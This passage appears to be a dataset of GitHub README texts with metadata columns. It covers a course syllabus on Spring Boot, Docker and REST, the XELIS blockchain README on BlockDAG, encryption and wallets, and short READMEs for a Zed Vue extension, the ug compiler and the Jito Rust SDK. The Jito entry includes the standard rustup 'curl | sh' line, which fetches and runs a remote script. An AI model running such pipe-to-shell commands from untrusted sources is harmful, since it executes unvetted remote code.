   - **Spring Boot Project Structure**: Understanding the typical structure of a Spring Boot project and how it facilitates development.

2. **Overview of Cloud-Based IDEs**
   - **GitHub Codespaces**: Cloud-hosted development environments integrated with GitHub, enabling easy setup and collaboration.
   - **Gitpod**: Automating cloud-based development workspaces with pre-configured environments.
   - Advantages of cloud-based IDEs for Spring Boot development: instant setup, collaboration, and scalability.

---

### **Learning Objectives**
By the end of this lecture, students will be able to:
- Describe the evolution of Spring to Spring Boot and how Spring Boot improves application development.
- Use Spring Initializr to create Spring Boot projects with appropriate dependencies.
- Understand and configure application properties using `application.properties` in Spring Boot.
- Identify the key components and structure of a typical Spring Boot project.
- Compare GitHub Codespaces and Gitpod, and explain how cloud-based IDEs enhance Spring Boot development workflows.

---

### **Student/Review Questions**
1. What are the key differences between traditional Spring and Spring Boot?
2. How does Spring Initializr simplify the creation of Spring Boot projects, and what are some essential dependencies you might include?
3. What role does the `application.properties` file play in a Spring Boot project?
4. What can you derive from the following code snippet:
```java
	@GetMapping(""/hello/{name}"")
	public String sayHelloWithParameter(@PathVariable String name){

		return ""Hallo, ""+name;

	}
```
5. How does GitHub Codespaces or Gitpod make it easier to develop Spring Boot applications in a cloud environment?
6. What are the key benefits of using a cloud-based IDE over a local development environment for any kind of development?

---

### **Suggested Reading & Resources**
- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
- [Spring Initializr](https://start.spring.io/)
- [Spring Boot Actuator Documentation](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html)
- [GitHub Codespaces Documentation](https://github.com/features/codespaces)
- [Gitpod Documentation](https://www.gitpod.io/docs)
- [Baeldung Actuator](https://www.baeldung.com/spring-boot-actuator-enable-endpoints)

### Homework
- Build a Spring Boot Hello, World REST API Project using Codespaces or GitPod

## **2024 / 10 / 25 - Containers**
### Content Overview

1. Development in distributed teams withouth containers and the potential problems:
   - Polyglot application landscapes are challenging as all work environments need to match all runtime requirements for all languages
   - Transporting application from environment A to environment B introduces challenges and problems with mismatching runtimes

2. **Containers**
   - Isolate Applications from each other
   - Package Applications along with all Runtime requirements for easy execution and transportation between working environments
   - Simplify configuration of working environments -> only container engine needed
   - handling of all application containers through same mechanisms: docker build, docker run

3. **Docker**
   - Docker ecosystem consists of the Docker Daemon, Docker CLI and Docker Hub+
   - Creation of Dockerfiles
   - Building Images
   - Running Containers

4. **Exercises**
   - Exercises can be found at: https://lecture.new.trainings.nvtc.io/basics/container/

### **Student/Review Questions**
1. What is Docker, and how does it differ from traditional virtual machines?
2. Explain the concept of a Docker image and a Docker container. How are they related?
3. What are the main components of a Dockerfile? Describe the purpose of each component.
4. How does Docker ensure isolation and security between containers?
5. What is a container registry, and how do you use Docker Hub to share or deploy images?
6. Describe the process of building and running a containerized application using Docker, including common commands.

### Homework
- Get a Dockerhub account
- Work through the exercises

## **2024 / 11 / 08 - Cloud-Native Theory and Persistence **  

### **Content Overview**

1. **Distributed Systems Theory**
   - **CAP Theorem**: Understanding the trade-offs between Consistency, Availability, and Partition Tolerance in distributed systems.
   - **Conway's Law**: Exploring how software design reflects organizational structure and its implications for distributed systems.
   - **12-Factor Applications**: Best practices for building scalable, maintainable applications, focusing on principles like configuration, dependencies, and logging.
   - **Microservices**: Basic concept of microservices, its advantages, and challenges in distributed systems.

 2. **Introduction to Persistence, ORM, Spring Data, and Spring Data JPA**
   - **Persistence and ORM**: Discussed the importance of persistence for long-term data storage, introducing ORM as a way to map objects to relational database tables seamlessly.
   - **Spring Data JPA**: Explored how Spring Data JPA simplifies data access through repository interfaces, enabling easy CRUD operations and custom queries without boilerplate code.

---

### **Learning Objectives**
By the end of this lecture, students will be able to:

- Describe the CAP Theorem, its components, and how it affects design choices in distributed systems.
- Explain Conway‚Äôs Law and its influence on software architecture, especially in the context of microservices.
- List and apply the 12 factors for building scalable, portable, and maintainable applications.
- Define and differentiate microservices architecture from other architectural styles.

- Explain the concepts of **persistence** and **ORM** and identify their importance in distributed, database-driven applications.
- Set up **Spring Data JPA** to interact with a relational database and configure it using Docker Compose.

### **ABOVE ALL**

Be able to relate the concepts of CAP theorem and the 12-factor apps to the technologies we are covering in the lecture,
e.g. how do technologies like Spring Boot (or other frameworks/languages), Docker, Kubernetes incorporate or implement those aspects

---

### **Student/Review Questions**
1. What are the components of the CAP Theorem, and why can‚Äôt a distributed system fully achieve all three?
2. How does Conway‚Äôs Law impact the structure of a distributed system, especially when adopting a microservices architecture?
3. What are the key factors of a 12-factor app, and how do they contribute to application scalability and resilience?
4. Describe microservices concepts and some of its advantages over a monolithic architecture.
5. What is Object-Relational Mapping (ORM), and why is it beneficial for a database-backed application?
6. Explain how Spring Data JPA helps in managing CRUD operations in a database. 

---

### **Suggested Reading & Resources**
- [Understanding the CAP Theorem](https://cs.uwaterloo.ca/~kmsalem/courses/CS848/W16/readings/cap.pdf)
- [Conway‚Äôs Law - A Key Consideration in Architecture](https://www.thoughtworks.com/insights/blog/conways-law-and-modern-software-factories)
- [The Twelve-Factor App](https://12factor.net/)
- [Microservices Architecture Documentation](https://microservices.io/patterns/microservices.html)

## **2024 / 11 / 15 - APIs and REST & Distributed Application Development

![REST and multi-application setup](/images/2024_11_15_REST_multi_container.png)

### **Content Overview**

1. **API and REST**  
   - **HTTP Basics**: Core concepts of HTTP for APIs, including request/response structure.  
   - **Introduction to REST**: Understanding the foundational ideas of REST as defined by Roy Fielding and how RESTful APIs communicate.  
   - **Nouns and Verbs**: Structuring REST APIs around resources (nouns) and actions (verbs).  
   - **Representation**: Data formats in REST (e.g., JSON, XML) and the role of content negotiation.  
   - **HTTP Return Codes**: Standard HTTP status codes, their meanings, and when to use each in API responses.  
   - **Idempotency**: Ensuring repeatable requests yield the same results to prevent unintended side effects.  
   - **Richardson's Maturity Model**: Levels of RESTful maturity, from Level 0 (HTTP as a tunnel) to Level 3 (HATEOAS), to understand API design progression.  
   - **OpenAPI and Swagger**: Using OpenAPI for defining APIs, ensuring consistency, and employing Swagger UI for visualization and testing.

2. **Docker-Compose for Multi-Component Applications**  
   - Setting up multi-component applications using Docker Compose, integrating backend APIs, databases, and frontends in a single `docker-compose.yml` file.  
   - Configuration of service communication, externalized settings, and container networking to simplify deployment and scaling.

---

### **Objectives and Exercises**

*Students should be able to:*

- Describe the foundational principles of REST and explain the HTTP concepts that underpin REST APIs.  
- Use OpenAPI to define REST APIs and visualize them with Swagger UI.  
- Create and configure a Docker Compose file to integrate multiple application components and enable effective communication between services.  

---

### **Student/Review Questions**

1. **What are the core principles of REST, and how do they align with HTTP concepts?**  
2. **Explain the importance of structuring REST APIs around resources (nouns) and actions (verbs). Provide examples.**  
3. **What is Richardson‚Äôs Maturity Model, and how does it help assess the maturity of a REST API?**  
4. **Why is idempotency important in REST APIs? Give an example of an idempotent and a non-idempotent HTTP method.**  
5. **Describe the advantages of using OpenAPI for REST API documentation.**  
6. **How does Docker Compose enable multi-component application setups, and what are the benefits of externalized configuration?**  
7. **Explain the role of container networking in Docker Compose and how it facilitates service communication.**

---

## **HOMEWORK!!**

- Watch the recordings from the previous session - priority on cloud-native theory!

### **Suggested Reading & Resources**

- [Roy Fielding‚Äôs REST Dissertation](https://www.ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm)
- [HTTP Status Codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)
- [Richardson's Maturity Model](https://martinfowler.com/articles/richardsonMaturityModel.html)",0,0,1,,,0.0
0xtecasinoa/Xelis-Blockchain,master,"# XELIS
All rights reserved.

A from scratch blockchain made in Rust and powered by Tokio, using account model. XELIS is based on an event-driven system combined with the native async/await and works with a unique and from scratch p2p system. This allow to be notified on any events happening on the network and to be able to react to them instead of checking periodically for updates.

BlockDAG is enabled to improve the scalability and the security of the network. Homomorphic Encryption using ElGamal is used to provide privacy on transactions (transfered amounts) and balances.

ElGamal cryptosystem was choosen because it's a well known and studied encryption algorithm which has homomorphism features. ElGamal is fast and is used in combination with Ristretto255 curve to provide a good level of security (~128 bits of security). Homomorphic operations available using ElGamal are addition/subtraction between ciphertexts and/or plaintext and multiplication against plaintext value.

Account Model allows to have a more flexible system than UTXO model and to have a better privacy because there is no need to link inputs and outputs, which provide real fungibility. It allows also the fast-sync feature to only download the last state of the blockchain instead of downloading all the history.

Pruning system is also available to reduce the size of the blockchain by removing old blocks and transactions.

We also aims to enabled Smart Contracts support in the future.

We provide different built-in networks:
- Mainnet: Released April 20, 2024.
- Testnet: Running
- Devnet: this network is used for local development purpose where you want to create your own local chain. It has no peers

## Acknowledgments

[@cchudant](https://github.com/cchudant):
- Optimized decoding RistrettoPoint implementation (ECDLP).
- Twisted ElGamal implementation along ZK-Proofs integration for Confidential Transactions.
- To read more, please see [XELIS-HE](https://github.com/xelis-project/xelis-he) framework created by him.

[@deroholic](https://github.com/deroholic):
- Difficulty adjustment algorithm using Kalman-Filter.

Thank you to every people testing actively the code base, honest miners and every future contributors!

## Main features

The main features of XELIS are the following:
- **BlockDAG**: reduce orphaned blocks rate.
- **Egalitarian Mining**: any CPU or GPU can mine XELIS easily.
- **Privacy**: Homomorphic Encryption allows to have encrypted balances and encrypted transfered amounts.
- **Confidential Asset**: Any asset deployed on XELIS network will have the same privacy and functionality like XELIS. Not just a number in a Smart Contract.
- **Event system**: every event happening on the network (daemon or wallet) can be detected and notified easily.
- **Instant Sync**: Your wallet balances and history is synced in few seconds.
- **Smart Contracts**: Create and deploy unstoppable decentralized applications.
- **Integrated addresses**: introduce any data in your wallet address to share informations in a transaction.
- **Easy to use**: We aims to provide the most easiest platform to build and use daily.

## Objectives

The main objectives of XELIS are:
- Provide privacy on transactions / balances.
- Provide Smart Contracts support.
- Secure and fast.

Others objectives in mind are:
- Provide real custom assets working as the native coin.
- Designed as CPU/GPU mining friendly to improve decentralization as possible.
- Simple to use.
- Community driven decisions.

## Config

### Network

- Expected Block Time is `15` seconds
- Address prefix is `xel` on mainnet and `xet` for testnet/devnet
- Transaction fee is `0.01000` XEL per KB
- Up to `8` decimals
- Maximum supply: `18.4` millions
- Maximum block size: `1.25`¬†MB
- Difficulty adjustment algorithm: retarget at every block
- Block reward emission: retarget at every block (Smooth decrease)

### Daemon

- Default P2P port is `2125`
- Defaut RPC Server port is `8080`

### Wallet

- Default RPC Server port is `8081`

## Roadmap

- Include extra fees when sending coins to a not-yet registered address
- Support of Smart Contracts (xelis-vm)
- Privacy (through Homomorphic Encryption)

## BlockDAG

XELIS use a blockDAG with following rules:
- A block is considered `Sync Block` when the block height is less than `TOP_HEIGHT - STABLE_LIMIT` and it's the unique block at a specific height (or only ordered block at its height and don't have lower cumulative difficulty than previous blocks).
- A block is considered `Side Block` when block height is less than or equal to height of past 8 topological blocks.
- A block is considered `Orphaned` when the block is not ordered in DAG (no topological height for it).
- A height is not unique anymore.
- Topo height is unique for each block, but can change when the DAG is re-ordered up to `TOP_HEIGHT - STABLE_LIMIT`.
- You can have up to 3 previous blocks in a block.
- For mining, you have to mine on one of 3 of the most heavier tips.
- Block should not have deviated too much from main chain / heavier tips.
- Maximum 9% of difficulty difference between Tips selected in the same block.
- Side Blocks receive only 30% of block reward.
- Supply is re-calculated each time the block is re-ordered because its based on topo order.
- Transactions and miner rewards are re-computed when a new block is added and the block there linked to is not yet in stable topo height. 
- A same transaction can be added in more than a block if they are not in the same tip branch. Client protocol will execute it only one time.

Topoheight represents how many unique blocks there is in the blockchain ordered by DAG.

A block ordered is a valid and executed one.

Topoheight order is unstable and may change until the blocks are in the stable height.

Longest chain is the one selected by nodes. But for tips branches conflicts, cumulative difficulty is used to select the main chain.

## Homomorphic Encryption

Homomorphic Encryption (HE) will allow to add privacy on transactions and accounts by doing computation while staying in encrypted form.
Each balances, transaction assets values are in encrypted form and nobody can determine the real value of it except involved parties.

**NOTE**: This part is not yet deployed and is under heavy work.

## Mining

Mining capabilities of XELIS are a bit differents from others chains because of standards being not implemented.
Each job send to a miner is a `MinerWork` instance in hex format.

The `MinerWork` is in following format:
- header work hash: 32 bytes
- timestamp (u64 for milliseconds): 8 bytes (BigEndian)
- nonce (u64): 8 bytes (BigEndian)
- extra nonce: 32 bytes
- miner public key: 32 bytes

The total block work size should be equal to 120 bytes.
Header work hash is the immutable part of a block work, its a hash calculated using `Blake3` hashing algorithm with the following format as input:
- block version: 1 byte
- block height (u64): 8 bytes (BigEndian)
- Hash of the tips: 32 bytes
- Hash of the transactions hashes: 32 bytes

The header work has to be equal to 73 bytes exactly and its hash to 32 bytes.

**WARNING**: Miner key is not included in the immutable of the block work (aka header work hash).
This is done so a block template can be generic and easily updatable for any miner without re-generating a new block template each time.

For pool development, you must verify that the miner public key in a received share is yours as it can be updated.

All hashes are calculated using the `Blake3` hashing algorithm except the Proof-Of-Work hash, which use [xelis-hash](https://github.com/xelis-project/xelis-hash).

POW Hash should be calculated from the `MinerWork` format and compared against the target difficulty.

**NOTE**: It is recommended to use the GetWork WebSocket server to be notified of new block work and submit correct work.

Mining jobs from GetWork are only sent when a new block is found or when a new TX is added in mempool.
Miners software are recommended to update themselves the block timestamp (or at least every 500ms) for best network difficulty calculation.

## Client Protocol

XELIS integrate along with BlockDAG a way to accept multiple times the same TX and only execute it one time.
Instead of excluding the whole block because we have a collision with another blockDAG branch for a TX, we just don't execute the TX and keep its hash.

The same TX can be contained in multiple blocks only if:
- TX is not executed in stable height
- TX is not included in block Tips (previous blocks)

Also, for more security, user account should only do TXs on the same chain/tip to prevent any orphaned TX.
An orphaned TX can happens when two differents TXs (but same owner) with the same nonce are sent in two differents branchs. 

During the generation of the DAG order (linking unique topoheight to a block hash), the first block being ordered will execute the TX first.

This feature allows to accept others branch tips even if transactions are the same and prevent more orphans blocks when branches are merged.

## Transaction

Transaction types supported:
- Transfer: possibility to send many assets to many addresses in the same TX (up to 255 outputs inside)
- Burn: publicly burn amount of a specific asset and use this TX as proof of burn (coins are completely deleted from circulation)
- Call Contract: call a Smart Contract with specific parameters and list of assets to deposit (WIP) (NOTE: Multi Call Contract in the same TX ?)
- Deploy Contract: deploy a new (valid) Smart Contract on chain (WIP)

At this moment, transactions are public and have the following data.
|   Field   |       Type      |                                   Comment                                  |
|:---------:|:---------------:|:--------------------------------------------------------------------------:|
|   owner   |    PublicKey    |                         Signer of this transaction                         |
|    data   | TransactionType |                 Type with data included of this transaction                |
|    fee    |     Integer     |             Fees to be paid by the owner for including this TX             |
|   nonce   |     Integer     | Matching nonce of balance to be validated and prevent any replay TX attack |
| signature |    Signature    |          Valid signature to prove that the owner validated this TX         |

Transactions support any registered asset natively.

To prevent any replay attack or double spending, each TX should include a nonce that match the account balance.
After each TX, the nonce is incremented by 1.

## Integrated Address

Integrated address are base address with custom data integrated.
For example, you can integrate in it a unique identifier that will be integrated in the future transaction done using it. Its helpful to determine easily which account to link a transaction with an account/order on service side.

Maximum data allowed is 1KB (same as transaction payload).

Every data is integrated in the transaction payload when using an integrated address.

## P2p (Encrypted Network)

All transfered data are using a custom Serializer/Deserializer made by hand to transform a struct representation in raw bytes directly.
This serialization is done using the fixed position of each fields and their corresponding bits size.

Before sending a packet, we're encrypting it using ChaCha20-Poly1305 algorithm to prevent network traffic analysis and authenticate each transfered data.

Every data transfered is done through the Packet system which allow easily to read & transfer data and doing the whole serialization itself.

The connection for a new peer (took from the queue or a new incoming connections) is executed through a unique tokio task with the same allocated buffer for handshake.
This prevents any DoS attack on creating multiple task and verifying connection.

When the peer is verified and valid, we create him his own tasks. One for reading incoming packets and one for writing packets to him.
By separating both directions in two differents task it prevents blocking the communication of opposed side.

For transactions propagation, we keep in cache last N transactions sent or received from a peer to not send the same data twice during propagation.

The daemon also have 3 tokio tasks running:
- Maintains connections with seed nodes
- Chain sync (which select a random peer for syncing its chain)
- Ping task which build a generic ping packet which is send to every peers connected (or build a specific one for each when its necessary)

### Pruning Mode

This allows anyone who want to run a light node to reduce the blockchain size by deleting blocks, transactions and versioned balances.
The pruned topoheight can only be at a `Sync Block` and behind at least `PRUNE_SAFETY_LIMIT` blocks of the top topoheight.

For wallets connected to a pruned node, you can't retrieve transactions history and miner rewards which happened before the pruned topoheight.
But your balances are still up-to-date with the chain and if your wallets already synced them, they stay in your wallet database.

The security of the chain is not reduced as all your blocks were already verified by your own node locally.

### Fast Sync

Fast sync mode allow you to sync really fast the necessary data only to run a correct and valid version of the chain. For this we request a peer
to send us its chain state at a stable point, which include all accounts nonces, assets, balances, top blocks.
So in future, when the chain will be really heavy, anyone can still join it by using fast sync system, which is compatible with the pruning mode.

**WARNING**: You should use fast sync mode only with a trusted peer, because they can send you a potential fake chain.

### Boost Sync

This is requesting the full chain to others nodes, but faster.
Boost sync mode can be enabled using `--allow-boost-sync-mode`. This mode use more resources but sync much faster.
It is faster because it's requesting blocks to sync in parallel, instead of traditional synchronization that would just request one block, verify it, execute it, repeat.
It's not enabled by default to prevent too much load on nodes. 

This is the perfect mix between Fast sync and traditional chain sync, to have the full ledger while being faster.

### Packets

This parts explains the most importants packets used in XELIS network to communicate over the P2p network.

#### Key Exchange

Key Exchange is the real first packet to be sent when creating a new connection.
This allow to exchange symetric encryption keys between peer to establish an encrypted communication channel over TCP.

Currently, we are using ChaCha20-Poly1305 algorithm to encrypt / decrypt every packets.

This packet can be sent later to rotate the key of a peer.
This is currently done every 1 GB of data sent.

We're using two different symetric keys for encryption per Peer.
One key is from us, to encrypt our packet, and the other key is to decrypt peer's packets.

#### Handshake

Handshake packet must be the first packet sent with the blockchain state inside to upgrade a connection to a peer.
If valid, the peer will send the same packet with is own blockchain state.

Except at beginning, this packet should never be sent again.

#### Ping

Ping packet is sent at an regular interval and inform peers of the our blockchain state.
Every 15 minutes, the packet can contains up to `MAX_LEN` sockets addresses (IPv4 or IPv6) to help others nodes to extends theirs peers list.

#### Chain Sync

We select randomly a peer which is higher in height from the peers list than us and send him a chain request.

The chain request includes last `CHAIN_SYNC_REQUEST_MAX_BLOCKS` blocks hashes of our chain with theirs topoheight espaced exponentially.
This data is used by the select peer to try to find a common point with our chain and his own (block hash must be at same topoheight as other peer).
If selected peer found a common point, he add up to `CHAIN_SYNC_RESPONSE_MAX_BLOCKS` blocks hashes ordered by block height.

Through the ""ask and await"" request object system, we ask the complete block (block header with transactions included) and add it to chain directly.

Chain sync is requested with a minimum interval of `CHAIN_SYNC_DELAY` seconds.

#### Block Propagation

Block propagation packet contains the block header only. Its sent to all peers who have theirs height minus our height less than `STABLE_LIMIT`.
To build the block, we retrieve transactions from mempool.
If a transaction is not found in the mempool, we request it from the same peer in order to build it.

#### Transaction Propagation

Transaction propagation packet contains the hash only to prevent sending the TX.
Its also backed by a cache per peer to knows if the transaction was already received from him / send to him.

## Storage

All theses data are saved in plaintext.

|          Tree         |  Key Type  |     Value Type    |                         Comment                        |
|:---------------------:|:----------:|:-----------------:|:------------------------------------------------------:|
|      transactions     |    Hash    |    Transaction    |      Save the whole transaction based on its hash      |
|         blocks        |    Hash    |    Block Header   |      Save the block header only based on its hash      |
|    blocks_at_height   |   Integer  |   Array of Hash   |        Save all blocks hash at a specific height       |
|         extra         |    Bytes   |  No specific type |Save the highest topo height, pruned topoheight and TIPS|
|      topo_by_hash     |    Hash    |      Integer      |       Save a block hash at a specific topo height      |
|      hash_by_topo     |   Integer  |        Hash       |      Save a topo height for a specific block hash      |
| cumulative_difficulty |    Hash    |      Integer      |   Save the cumulative difficulty for each block hash   |
|         assets        |    Hash    |      Integer      |  Verify if an assets exist and its registration height |
|        rewards        |   Integer  |      Integer      |                  Save the block reward                 |
|         supply        |   Integer  |      Integer      |  Calculated supply (past + block reward) at each block |
|       difficulty      |    Hash    |      Integer      |                Difficulty for each block               |
|       tx_blocks       |    Hash    |   Array of Hash   |      All blocks in which this TX hash is included      |
|       balances        |   Custom   |      Integer      |          Last topoheight of versioned balance          |
|         nonces        | Public Key |      Integer      |     Store the highest topoheight of versioned nonce    |
|  versioned_balances   |   Custom   | Versioned Balance |   Key is composed of topoheight + asset + public key   |
|   versioned_nonces    |   Custom   |  Versioned Nonce  |       Key is composed of topoheight + public key       |

**NOTE**:
- Tree `balances` has a custom key which is composed of 32 bytes of Public Key and 32 bytes of Asset.
- Balances and nonces are versioned, which means they are stored each time a change happened in chain.
- Using a Tree per version is too heavy because of overhead per trees, solution is to hash a generated key based on properties.
- Assets registered have in value their topoheight at which it was registered.
- Supply and block rewards are only stored when the block is topologically ordered

The database engine used is sled. It may changes in future.

Current overhead per block:
- Tree `blocks` saving Block header (132 bytes with no TXs) value using Hash (32 bytes) key.
- Trees `topo_by_hash` and `hash_by_topo` saving both Hash (32 bytes) <=> topoheight (8 bytes) pointers. (x2)
- Tree `difficulty` saving Difficulty value of a block (up to 33 bytes) using Hash (32 bytes) key.
- Tree `cumulative_difficulty` saving the cumulative difficulty value (up to 33 bytes) of a topoheight (8 bytes).
- Tree `rewards` saving block reward value (8 bytes) using topoheight (8 bytes) key.
- Tree `supply` saving current circulating supply value (8 bytes) using topoheight (8 bytes) key.
- Tree `versioned_balances` is updated at each block (for miner rewards), and also for each account that had interactions (transactions): 72 bytes for key and 16 bytes for value.
- Tree `versioned_nonces` is updated for each account that send at least one TX per topoheight: 40 bytes for key and 16 bytes for value

At this moment with current implementation, minimal overhead per new account is 208 bytes for keys and 56 bytes for values:
- `balances` Public Key + Asset (64 bytes) => topoheight of last versioned balance (8 bytes)
- `nonces` Public Key (32 bytes) => topoheight of last versioned nonce (8 bytes)
- `versioned_balances` Public Topoheight + Key + Asset (72 bytes) => Versioned Balance (16 bytes)
- `versioned_nonces` Topoheight + Public Key (40 bytes) => Versioned Nonce (16 bytes)

An optimized version could be done to reduce further the disk usage by creating pointers.
Instead of saving multiple times the whole Public Key (32 bytes), we create a pointer table to which a u64 value is assigned.
And we store this u64 id instead of the whole Public Key, asset..

## Wallet

Wallet keep tracks of all your transactions on chain, all your assets you own.

When creating a new wallet, it generate a new random secure ""master key"" which will be encrypted by a password hashed.
This master key allows to change easily the password of your wallet because you only have to save new encrypted version of it.

The master key is also the one which will be able to decrypt/encrypt all your wallet storage.

This way allow to save securely and easily data on any device.

Password hashing algorithm used is Argon2id with a configuration of 15 MB and 16 iterations.

### Storage

Wallet implement a fully-encrypted storage system with following features:
- Tree names are hashed with generated salt
- Keys data are hashed with generated salt
- Values are encrypted using XChaCha20Poly1305 and a random newly generated nonce each time its saved. 

Exception for assets list which has its key encrypted to be able to retrieve them later.

Hash algorithm used is Blake3 for keys / tree names.
The random salt generated is a 64 bytes length.
This simple system prevent someone to read / use the data without the necessary secret key.

### Data Type and Value

This protocol allows to transfer data through a custom wallet address called `integrated address`.
It will simply integrate encoded data in the wallet address which can be used to send specific data to the wallet when creating a transaction.
Each transaction can reserve up to 1 KB of space (for encrypted data transfering for example).

You can create simple service / communication on chain through wallets while staying anonymous and in encrypted form.

Actually, you can have following values through API:
- Null value representation
- Boolean
- String
- Unsigned numbers (`u8`, `u16`, `u32`, `u64`, `u128`)

And these types:
- Value (which is only one value, can be used for PaymentID representation)
- Array (of any different values types)
- Fields (which can be used to represent custom `struct` for example)

## API

Http Server run using Actix Framework and serve the JSON-RPC API and WebSocket.

### JSON-RPC

JSON-RPC is available on `/json_rpc` route on RPC server address that you set (or default one).
For a much more detailed API, see the API documentation [here](API.md).

### WebSocket

WebSocket allow JSON-RPC call and any app to be notified when a specific event happens on the daemon.
It is running on `/ws` route on same RPC server address.

Example to subscribe to a registered event in the WebSocket connection:
```json
{
    ""jsonrpc"": ""2.0"",
    ""id"": 1,
    ""method"": ""subscribe"",
    ""params"": {
        ""notify"": ""new_block""
    }
}
```

You can notify to several events, just do a request for each event you want.
The daemon will send you every events happening as long as you don't unsubscribe or close the WebSocket.

Example to unsubscribe to a specific event:
```json
{
    ""jsonrpc"": ""2.0"",
    ""id"": 1,
    ""method"": ""unsubscribe"",
    ""params"": {
        ""notify"": ""new_block""
    }
}
```

#### Daemon

Events availables to subscribe on the daemon API are:
- `block_ordered`: when a block is ordered by DAG
- `stable_height_changed`: when the stable height has been updated
- `peer_connected`: when a new peer has connected to the node
- `peer_disconnected`: when a peer disconnected from us
- `peer_peer_list_updated`: when the peerlist of a peer has been updated
- `peer_state_updated`: when the peer state has been updated
- `peer_peer_disconnected`: when a common peer disconnect from one of our peer
- `new_block`: when a new block is accepted by chain
- `transaction_added_in_mempool`: when a new valid transaction is added in mempool
- `transaction_executed`: when a transaction has been included in a valid block & executed on chain
- `transaction_sc_result`: when a valid TX SC Call hash has been executed by chain
- `new_asset`: when a new asset has been registered
- `block_ordered` when a block is ordered for the first time or reordered to a new topoheight
- `block_orphaned` when a block that was previously ordered became orphaned because it was not selected in DAG reorg.

#### Wallet

Events availables to subscribe on the wallet API are:
- `new_topoheight`: when a new topoheight is sent by the daemon
- `new_asset`: when a new asset has been added to the wallet.
- `new_transaction`: when a new transaction (coinbase, outgoing, incoming) has been added to wallet history.
- `balance_changed`: when a balance changes has been detected.
- `rescan`: when a rescan happened on the wallet.
- `online`: when the wallet network state is now online.
- `offline`: whenthe wallet network state is now offline.

### XSWD

XSWD (XELIS Secure WebSocket DApp) Protocol is a WebSocket started on unique port `44325` and path `/xswd` for easy findings from dApps.
Its job is to provide an easy to access and secure way to communicate from a desktop/CLI wallet to any dApp (software or in-browser/websites directly).

It's based on the JSON-RPC API and have exact same methods for easy compabitility, the only exception is how verification is done.
On a traditional RPC-Server, if authentication is enabled, you must provide a username/password.

XSWD stay open but request a manual action from user to accept the connection of the dApp on the XSWD Server.
When accepted, the dApp can requests JSON-RPC methods easily and the user can set/configure a permission for each method.
If no permission is found for a request method, it will be prompted/asked to the user for manual verification.

XSWD also have the ability to sends JSON-RPC requests to the daemon directly.
For this, set the prefix `node.` in front of daemon requests, it will not be requested to the user as it's public on-chain data.
For wallets RPC methods, set the prefix `wallet.` which will requests/use the permission set by the user.

DApp can also request to sign the `ApplicationData` to persist the configured permissions on its side and then provide it when user would reconnect later.

First JSON message from the dApp must be in following format to identify the application:
```json
{
    ""id"": ""0000006b2aec4651b82111816ed599d1b72176c425128c66b2ab945552437dc9"",
    ""name"": ""XELIS Example"",
    ""description"": ""Description example of up to 255 characters"",
    ""url"": ""https://xelis.io"",
    ""permissions"": {}
}
```

You can also add `signature` field and provide signed permissions if your dApp requested a signature from wallet in previous connection.

If dApp is accepted by user through XSWD, you will receive the following response:
```json
{
    ""id"": null,
    ""jsonrpc"": ""2.0"",
    ""result"": true
}
```

Otherwise, an error like this will be sent and the connection will be closed by the server:
```json
{
    ""error"": {
        ""code"": -32603,
        ""message"": ""Invalid JSON format for application data""
    },
    ""id"": null,
    ""jsonrpc"": ""2.0""
}
```

## How to build

Building this project requires a working [Rust](https://rustup.rs) (stable) toolchain.

It's expected to be cross-platform and guaranteed to work on Linux, Windows, MacOS platforms.

### Build from sub project
Go to one of following folder you want to build from source: `xelis_daemon`, `xelis_miner` or `xelis_wallet`.
To build a release (optimized) version:
`cargo build --release`

### Build from workspace
To build a version from workspace (parent folder) directly, use the option `--bin` with `xelis_daemon`, `xelis_miner` or `xelis_wallet` as value.
Example: `cargo build --release --bin xelis_miner`

You can also build a debug version (just remove `--release` option) or run it directly from cargo:
`cargo run`

### Build from Docker
To build using Docker, use the following command, using the `app` build argument to chose which project to build:
`docker build -t xelis-daemon:master --build-arg app=xelis_daemon .`

## Funding

XELIS is a community driven project and is not funded by any company or organization.
To helps the development, the success and provide a better support of XELIS, we set a dev fee percentage starting at 15% on block reward.

Current dev fee curve is as following:

- 15% from block 0 to 1 250 000 (expected time is ~6 months with side blocks from blockDAG)
- 10% from block 1 250 001 to 3 000 000 (expected time is another ~6 months with side blocks from blockDAG and network growing)
- 5% from 3 000 001 until the project being developed and stable enough to reduce it.
- 
",0,0,1,,"docker-publish.yml,rust.yml",0.0
zed-extensions/vue,main,"# Zed Vue

A [Vue](https://vuejs.org/) extension for [Zed](https://zed.dev).

## Development

To develop this extension, see the [Developing Extensions](https://zed.dev/docs/extensions/developing-extensions) section of the Zed docs.
",0,3,1,Apache-2.0,,4.0
LaurentMazare/ug,main,"# ug

![rust ci badge](https://github.com/LaurentMazare/ug/actions/workflows/rust-ci.yml/badge.svg)

Experimental compiler for deep-learning models inspired by
[triton](https://github.com/triton-lang/triton),
[tinygrad](https://github.com/tinygrad/tinygrad/), and
[micrograd](https://github.com/karpathy/micrograd).
",0,0,2,Apache-2.0,rust-ci.yml,1.0
jito-labs/jito-rust-rpc,master,"# jito-sdk-rust

[![Discord](https://img.shields.io/discord/938287290806042626?label=Discord&logo=discord&style=flat&color=7289DA)](https://discord.gg/jTSmEzaR)
![Rust](https://img.shields.io/badge/Rust-Language-orange?logo=rust)
![Crates.io](https://img.shields.io/crates/v/jito_sdk_rust?label=crates.io&logo=rust)
[![docs.rs](https://img.shields.io/badge/docs.rs-jito_sdk_rust-blue?logo=rust)](https://docs.rs/jito-sdk-rust/0.1.0/jito_sdk_rust/)

The Jito JSON-RPC Rust SDK provides an interface for interacting with Jito's enhanced Solana infrastructure. This SDK supports methods for managing bundles and transactions, offering improved performance and additional features while interacting with the Block Engine.

## Features

### Bundles
- `getInflightBundleStatuses`: Retrieve the status of in-flight bundles.
- `getBundleStatuses`: Fetch the statuses of submitted bundles.
- `getTipAccounts`: Get accounts eligible for tips.
- `sendBundle`: Submit bundles to the Jito Block Engine.

### Transactions
- `sendTransaction`: Submit transactions with enhanced priority and speed.

## Installation

### Prerequisites

This project requires Rust for development. If you haven't installed Rust yet, follow these steps:

1. **Install Rust**:
   ```bash
   curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
   ```

2. Follow the on-screen instructions to complete the installation.

3. Verify the installation:
   ```bash
   rustc --version
   ```

4. (Optional but recommended) Keep Rust up to date:
   ```bash
   rustup update
   ```

### Adding jito-sdk-rust to Your Project

